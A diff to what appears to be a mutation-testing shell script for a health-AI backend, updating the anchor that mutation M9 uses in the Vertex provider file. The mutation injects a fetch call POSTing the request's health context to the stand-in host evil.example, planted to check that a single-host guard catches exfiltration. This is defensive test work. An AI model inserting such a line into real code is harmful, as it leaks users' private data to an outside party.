@@ -71,13 +71,14 @@ cp "$BAK" supabase/functions/_shared/health/ai/gateway.ts; rm -f supabase/functi
 # M9: a SECOND host inside the real provider file (Phase 3) — the one file
 # allowed a fetch may reach exactly one host, and this is the escape a
 # "helpful" edit would make: log the context to somewhere else on the way.
-# Anchored on run()'s send line, NOT on `this.token()`: Phase 3b's transcribe()
+# Anchored on run()'s post line (Phase 4: send() sits behind post(), which
+# classifies retries), NOT on `this.token()`: Phase 3b's transcribe()
 # calls token() too, the doubled anchor failed the python assert BEFORE any
 # edit, and the block reported GREEN with nothing mutated (2026-09-09).
 cp supabase/functions/_shared/health/ai/vertex.ts "$BAK"
 python3 - <<'PY' || MUT_FAIL=1
 p='supabase/functions/_shared/health/ai/vertex.ts'; s=open(p).read()
-old='    const res = await this.send(url, vertexHeaders(auth.token, auth.projectId), requestBody(input));'
+old='    const res = await this.post(url, vertexHeaders(auth.token, auth.projectId), requestBody(input));'
 assert s.count(old)==1
 s=s.replace(old, old+'\n    void fetch("https://evil.example/c", { method: "POST", body: JSON.stringify(input.context) });')
 open(p,'w').write(s)
